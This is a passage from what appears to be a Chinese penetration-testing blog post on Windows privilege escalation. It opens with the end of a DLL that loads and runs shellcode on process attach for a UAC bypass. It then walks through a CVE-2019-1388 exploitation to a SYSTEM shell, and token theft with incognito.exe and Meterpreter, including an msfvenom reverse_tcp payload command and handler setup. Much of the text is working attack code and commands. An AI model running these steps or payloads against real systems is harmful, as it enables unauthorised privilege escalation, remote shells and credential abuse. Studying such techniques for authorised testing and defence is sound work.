<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span>(__stdcall* JMP_SHELLCODE)();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[<span class="hljs-number">800</span>] = &#123;shellcode&#125;;<br><br>DWORD WINAPI jmp_shellcode(LPVOID pPara)<br>&#123;<br>LPVOID lpBase = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT,<br>PAGE_EXECUTE_READWRITE);<br>memcpy(lpBase, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>JMP_SHELLCODE jmp_shellcode = (JMP_SHELLCODE)lpBase;<br>jmp_shellcode();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">BOOL</span> WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)<br>&#123;<br><span class="hljs-keyword">switch</span>(fdwReason)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br>hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, jmp_shellcode, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">/* Return TRUE on success, FALSE on failure */</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109162402874.png" srcset="/img/loading.gif" lazyload alt="image-20240109162402874"> </p>
<p>接下来运行白名单程序，可看待提权成功，绕过了UAC认证</p>
<p><img src="/img/image-20240109162520282.png" srcset="/img/loading.gif" lazyload alt="image-20240109162520282"></p>
<h2 id="CVE-2019-1388-UAC提权"><a href="#CVE-2019-1388-UAC提权" class="headerlink" title="CVE-2019-1388 UAC提权"></a>CVE-2019-1388 UAC提权</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>CVE-2019-1388 UAC提权是一个Windows证书对话框特权提升漏洞，此漏洞是因为 UAC（用户账户控制）机制的设定不严导致的。默认情况下，</p>
<p><strong>Windows UAC 提示本身是由名为 consent.exe 的可执行文件生成的，该可执行文件以 NT AUTHORITY\SYSTEM 身份运行并且有 System 的完整性水平</strong>。</p>
<p><strong>即UAC的弹窗就是最高权限运行的</strong></p>
<p>由于用户可以与此UI 进行交互（点击是 否等），因此有必要对 UI 进行严格限制。否则，低特权用户可能能够通过UI操作提权到system权限</p>
<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>漏洞影响的版本如下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span> server机器<br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2008</span>r2 <span class="hljs-number">7601</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2012</span>r2 <span class="hljs-number">9600</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2016</span> <span class="hljs-number">14393</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2019</span> <span class="hljs-number">17763</span><br><br><span class="hljs-attribute">windows</span> 个人电脑<br><span class="hljs-attribute">Windows</span> <span class="hljs-number">7</span> SP1 <span class="hljs-number">7601</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">8</span> <span class="hljs-number">9200</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">8</span>.<span class="hljs-number">1</span> <span class="hljs-number">9600</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1511</span> <span class="hljs-number">10240</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1607</span> <span class="hljs-number">14393</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1703</span> <span class="hljs-number">15063</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1709</span> <span class="hljs-number">16299</span><br></code></pre></td></tr></table></figure>

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果在运行一个可执行文件的时候我们触发了 UAC，在点击「显示有关此发步者的证书的信息」这个链 接之后我们可以看到证书里的 Issued by（颁发者） 字段，这个字段对应的值就是 OID值，如果这里<strong>是一个超链接就可以提权</strong>，如果不是就不行</p>
<p>使用HHUPD.exe</p>
<p><img src="/img/image-20240109164353457.png" srcset="/img/loading.gif" lazyload alt="image-20240109164353457"></p>
<p>通过点击此链接会触发以 SYSTEM 权限打开浏览器，然后此浏览器就会有 SYSTEM 权限，（浏览器打开必须先要关闭UAC对话框）通过保存按钮打开CMD，CMD就会继承浏览器的 SYSTEM 权限，由此就 完成了由普通用户到 NT AUTHORITY\SYSTEM 用户的提权。</p>
<img src="/img/image-20240109164626095.png" srcset="/img/loading.gif" lazyload alt="image-20240109164626095" style="zoom:80%;" /> 

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>查看当前的用户权限是r1cky，是一个低权限</p>
<p><img src="/img/image-20240109165035918.png" srcset="/img/loading.gif" lazyload alt="image-20240109165035918"> </p>
<p>以管理员权限打开HHUPD.EXE，点击显示详细信息里显示的显示有关此发布者的证书的信息</p>
<p><img src="/img/image-20240109165046377.png" srcset="/img/loading.gif" lazyload alt="image-20240109165046377"></p>
<p>点击该链接之后，关闭上面这两个弹窗，会出现浏览器的页面</p>
<img src="/img/image-20240109165054622.png" srcset="/img/loading.gif" lazyload alt="image-20240109165054622" style="zoom:80%;" /> 

<p>IE浏览器访问链接后点击页面下拉菜单面里的另存为选项</p>
<p><img src="/img/image-20240109165122619.png" srcset="/img/loading.gif" lazyload alt="image-20240109165122619"></p>
<p>弹出位置不可用的对话框点确定</p>
<p>在文件名的位置输入如下的信息 C:\Windows\System32*.*</p>
<p>找到里面的CMD文件，右键打开，即为system权限</p>
<p><img src="/img/image-20240109165305489.png" srcset="/img/loading.gif" lazyload alt="image-20240109165305489"></p>
<p><img src="/img/image-20240109165351626.png" srcset="/img/loading.gif" lazyload alt="image-20240109165351626"> </p>
<p><img src="/img/image-20240109165408677.png" srcset="/img/loading.gif" lazyload alt="image-20240109165408677"> </p>
<h2 id="Windows令牌概述和令牌窃取攻击"><a href="#Windows令牌概述和令牌窃取攻击" class="headerlink" title="Windows令牌概述和令牌窃取攻击"></a>Windows令牌概述和令牌窃取攻击</h2><h3 id="Windows令牌"><a href="#Windows令牌" class="headerlink" title="Windows令牌"></a>Windows令牌</h3><p>令牌（Token）是系统的临时密钥，相当于账户名和密码，<strong>用来决定是否允许这次请求和判断这次请求 是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动</strong></p>
<p>令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来，令牌有很多种，</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">访问令牌（Access <span class="hljs-built_in">Token</span>）表示访问控制操作主题的系统对象<br>会话令牌(Session <span class="hljs-built_in">Token</span>)：是交互会话中唯一的身份标识符，可以理解为web中的<span class="hljs-built_in">token</span><br>密保令牌（Security <span class="hljs-built_in">Token</span>）又叫作认证令牌或者硬件令牌，是一种计算机身份效验的物理设备<br></code></pre></td></tr></table></figure>

<p>Windows 的访问令牌（ AccessToken） 中包含如下内容</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gcode">用户账户的安全标识符<span class="hljs-comment">(SID)</span><br>用户所属的组的SID<br>用于标识当前登陆会话的登陆SID<br>用户或用户组所拥有的权限列表<br>所有者SID<br>主要组的SID<br>访问控制列表<br>访问令牌的来源<br>令牌是主要令牌还是模拟令牌<br>限制SID的可选列表<br>目前的模拟等级<br>其他统计的数据<br></code></pre></td></tr></table></figure>

<p>Windows 的访问令牌（ AccessToken） 有两种类型</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">Delegation <span class="hljs-keyword">Token</span>：授权令牌，也叫主令牌，支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)<br>Impresonation <span class="hljs-keyword">Token</span>：模拟令牌，支持非交互的会话 (例如使用 <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span>访问共享文件夹)。<br></code></pre></td></tr></table></figure>

<p>两种 token 只在系统重启后清除 </p>
<p>具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效</p>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="incognito窃取令牌"><a href="#incognito窃取令牌" class="headerlink" title="incognito窃取令牌"></a>incognito窃取令牌</h4><p>incognito.exe是一个令牌窃取的工具，常用用法如下</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">incognito.exe list_tokens -u 列出用户的令牌<br>incognito.exe<span class="hljs-built_in"> execute </span>-c <span class="hljs-string">&quot;令牌&quot;</span> 程序名 使用窃取的令牌执行命令<br></code></pre></td></tr></table></figure>

<p>1、当我们拿到一个权限的时候，如果是普通的用户或者有UAC认证的管理员用户，<strong>可以窃取的令牌只有自己的令牌不能用于提权</strong></p>
<p><img src="/img/image-20240109171055577.png" srcset="/img/loading.gif" lazyload alt="image-20240109171055577"> </p>
<p>2、如果是administrator或者绕过的UAC的管理员，就可以窃取到system用户的令牌</p>
<p><img src="/img/image-20240109171333051.png" srcset="/img/loading.gif" lazyload alt="image-20240109171333051"> </p>
<p>3、使用窃取的令牌进行提权</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">incognito.exe<span class="hljs-built_in"> execute </span>-c <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109171632734.png" srcset="/img/loading.gif" lazyload alt="image-20240109171632734"></p>
<h4 id="MSF中的令牌窃取"><a href="#MSF中的令牌窃取" class="headerlink" title="MSF中的令牌窃取"></a>MSF中的令牌窃取</h4><p>1、使用MSF上线，然后加载incognito</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.41.211 <span class="hljs-attribute">lport</span>=4488 -f<br>exe -o test.exe<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.41.211<br><span class="hljs-built_in">set</span> lport 4488<br>run<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109171921843.png" srcset="/img/loading.gif" lazyload alt="image-20240109171921843"> </p>
<p>2、加载incognito，进行令牌窃取，用法如下</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">load</span> incognito 加载incognito<br>list_tokens -u 列举<span class="hljs-keyword">token</span>令牌<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> 权限窃取<br>rev2self 或 drop_token 返回之前toke<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20240109171949167.png" srcset="/img/loading.gif" lazyload alt="image-20240109171949167"> </p>
<p><img src="/img/image-20240109171957626.png" srcset="/img/loading.gif" lazyload alt="image-20240109171957626"> </p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%8F%90%E6%9D%83/" class="category-chain-item">提权</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>提权-windows绕过UAC提权</div>
      <div>http://example.com/2024/01/09/提权-windows绕过UAC提权/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>r1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年1月9日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/" title="提权-windows系统错误配置提权">
                        <span class="hidden-mobile">提权-windows系统错误配置提权</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
